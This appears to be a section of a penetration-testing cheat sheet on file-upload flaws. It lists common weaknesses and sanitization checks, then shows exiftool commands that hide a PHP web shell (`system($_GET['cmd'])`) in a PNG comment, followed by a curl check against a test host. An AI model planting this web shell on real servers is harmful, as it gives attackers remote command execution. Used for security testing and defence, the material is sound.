#### 1.1. Common issues

Common issues in lax file-upload logic:

- overwrite file name and content
- arbitrary file extension is allowed
- mixed content may be executed based on file extension (`.php` file but `JPEG` mime-type)
- malicious files `.exe` can be distributed from trusted context
- image parser vulnerabilities (e.g. ImageTragick)
- was the image processed server-side?
  - compare the checksum of the original file with the checksum of the uploaded file
  - image sanitization can also be done by image resize (parser will rebuild the image for you)
- validation vs. sanitization = checking user input vs. altering user input to fit a specific purpose

#### 1.2. To inject malicious `php` in a `.png` file

Read info about the image:
```
# strings 1.png  #get all strings from image file
# exiftool 1.png #get meta information in files
```

Place the PHP code in a meta-data comment:
```
# echo '<?php system($_GET["cmd"]);?>' > 1.php
# exiftool 1.png '-comment<=1.php'
```

Check if the file was modified server-side:
```
# curl -sSL http://vuln.loc/admin/uploads/1438865053.png | strings | grep system
<?php system($_GET["cmd"]);
```
